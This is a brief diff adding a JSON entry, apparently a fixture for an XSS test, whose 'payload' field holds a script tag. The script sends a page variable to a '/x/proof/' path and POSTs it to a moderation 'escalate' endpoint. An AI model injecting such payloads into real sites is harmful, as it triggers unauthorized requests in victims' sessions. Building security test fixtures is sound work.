@@ -1,0 +1,4 @@
+{
+  "context": "chain",
+  "payload": "<script>fetch('/x/proof/'+window.__vendara_proof);fetch('/api/moderation/escalate?sid='+window.__vendara_proof,{method:'POST'})</script>"
+}
